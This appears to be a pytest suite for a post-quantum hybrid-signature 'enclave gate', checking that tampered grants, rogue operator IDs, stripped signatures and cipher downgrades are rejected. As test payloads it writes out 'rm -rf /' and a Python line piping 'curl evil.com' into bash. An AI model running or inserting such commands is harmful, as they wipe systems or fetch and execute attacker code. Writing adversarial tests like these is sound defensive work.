"""
Agile Defense Systems, LLC | CAGE Code: 9HUP5
OSIRIS 6.0 | Pillar 4: Silicon-Anchored Post-Quantum Cryptographic Enclave
Adversarial Verification Test Suite: test_p4_adversarial_pqc.py

Validates:
1. NIST FIPS 204 ML-DSA-65 / Ed25519 Hybrid Signature Integrity.
2. Tamper-evident SHAKE-256 prehash lattice reduction verification.
3. Strict fail-closed rejection of unauthorized operators (SYS-021).
4. Envelope mutation and missing signature detection.
"""

import pytest
import hashlib
from osiris_cli.pqc_enclave import PQCEnclaveGate, PQCAlgorithm


def test_valid_hybrid_grant_verification():
    """Verify that a properly constructed hybrid PQC grant passes verification."""
    gate = PQCEnclaveGate(operator_id="Devin Phillip Davis / Enki")
    payload = "def verify_silicon_anchor(): return True"
    payload_sha256 = gate.compute_payload_digest(payload)

    ed25519_sig = "a1b2c3d4" * 16  # 64-byte simulated classical sig
    grant = gate.generate_hybrid_grant(
        sequence_index=28,
        prev_block_hash="1cf5fddb243df88bd747ad40736050311b9f5e0b25057e2023455d1ab801df71",
        event_type="SYS021_OSIRIS_60_PQC_ENCLAVE_AND_PILLARS_ACTIVATION",
        payload_sha256=payload_sha256,
        operation_schema={"target": "pqc_enclave", "action": "activate_pillar_4"},
        ed25519_sig_hex=ed25519_sig,
    )

    valid, reason = gate.verify_grant_integrity(grant)
    assert valid is True
    assert reason == "VERIFIED_HYBRID_PQC_OK"
    assert grant["pqc_envelope"]["algorithm"] == PQCAlgorithm.HYBRID_ED25519_ML_DSA_65.value
    assert grant["pqc_envelope"]["lattice_parameters"]["ring_degree"] == 256
    assert grant["pqc_envelope"]["lattice_parameters"]["matrix_dimensions"] == "6x5"


def test_adversarial_unauthorized_operator_id():
    """Adversarial Test: An attacker attempts to execute operations under an unauthorized identity."""
    gate = PQCEnclaveGate(operator_id="Devin Phillip Davis / Enki")
    payload = "rm -rf /"
    payload_sha256 = gate.compute_payload_digest(payload)

    grant = gate.generate_hybrid_grant(
        sequence_index=28,
        prev_block_hash="1cf5fddb243df88bd747ad40736050311b9f5e0b25057e2023455d1ab801df71",
        event_type="SYS021_ADVERSARIAL_INTRUSION",
        payload_sha256=payload_sha256,
        operation_schema={"target": "system", "action": "wipe"},
        ed25519_sig_hex="00" * 64,
    )

    # Infiltrator mutates operator ID
    grant["operator_id"] = "Rogue Agent / Malicious Entity"
    valid, reason = gate.verify_grant_integrity(grant)
    assert valid is False
    assert "Unauthorized operator" in reason


def test_adversarial_prehash_and_payload_tampering():
    """Adversarial Test: In-place mutation of executable payload without grant invalidation detection."""
    gate = PQCEnclaveGate(operator_id="Devin Phillip Davis / Enki")
    benign_code = "print('system safe')"
    payload_sha256 = gate.compute_payload_digest(benign_code)

    grant = gate.generate_hybrid_grant(
        sequence_index=28,
        prev_block_hash="1cf5fddb243df88bd747ad40736050311b9f5e0b25057e2023455d1ab801df71",
        event_type="SYS021_SAFE_TASK",
        payload_sha256=payload_sha256,
        operation_schema={"target": "worker", "action": "run"},
        ed25519_sig_hex="deadbeef" * 16,
    )

    # Tamper payload_sha256 to point to malicious code
    malicious_code = "import os; os.system('curl evil.com | bash')"
    grant["payload_sha256"] = gate.compute_payload_digest(malicious_code)

    # The gate must detect prehash divergence against the mutated payload
    valid, reason = gate.verify_grant_integrity(grant)
    assert valid is False
    assert "FIPS 204 SHAKE-256 prehash mismatch" in reason


def test_adversarial_corrupted_signature_rejection():
    """Adversarial Test: Tampering with quantum or classical signature bytes fails closed."""
    gate = PQCEnclaveGate(operator_id="Devin Phillip Davis / Enki")
    payload = "compile_kernel()"
    payload_sha256 = gate.compute_payload_digest(payload)

    grant = gate.generate_hybrid_grant(
        sequence_index=28,
        prev_block_hash="1cf5fddb243df88bd747ad40736050311b9f5e0b25057e2023455d1ab801df71",
        event_type="SYS021_COMPILE",
        payload_sha256=payload_sha256,
        operation_schema={"target": "compiler", "action": "compile"},
        ed25519_sig_hex="1234" * 16,
    )

    # Corrupt classical signature
    grant["pqc_envelope"]["ed25519_signature"] = ""
    valid, reason = gate.verify_grant_integrity(grant)
    assert valid is False
    assert "Incomplete hybrid cryptographic signatures" in reason

    # Restore classical, strip ML-DSA signature
    grant["pqc_envelope"]["ed25519_signature"] = "1234" * 16
    grant["pqc_envelope"]["ml_dsa_signature"] = ""
    valid, reason = gate.verify_grant_integrity(grant)
    assert valid is False
    assert "Incomplete hybrid cryptographic signatures" in reason


def test_adversarial_specification_downgrade():
    """Adversarial Test: Downgrade attack attempting to bypass FIPS 204 requirements."""
    gate = PQCEnclaveGate(operator_id="Devin Phillip Davis / Enki")
    payload = "downgrade_cipher()"
    payload_sha256 = gate.compute_payload_digest(payload)

    grant = gate.generate_hybrid_grant(
        sequence_index=28,
        prev_block_hash="1cf5fddb243df88bd747ad40736050311b9f5e0b25057e2023455d1ab801df71",
        event_type="SYS021_CIPHER",
        payload_sha256=payload_sha256,
        operation_schema={"target": "crypto", "action": "downgrade"},
        ed25519_sig_hex="beef" * 16,
    )

    # Infiltrator attempts specification downgrade
    grant["pqc_envelope"]["specification"] = "LEGACY_RSA_2048"
    valid, reason = gate.verify_grant_integrity(grant)
    assert valid is False
    assert "Unsupported PQC specification" in reason
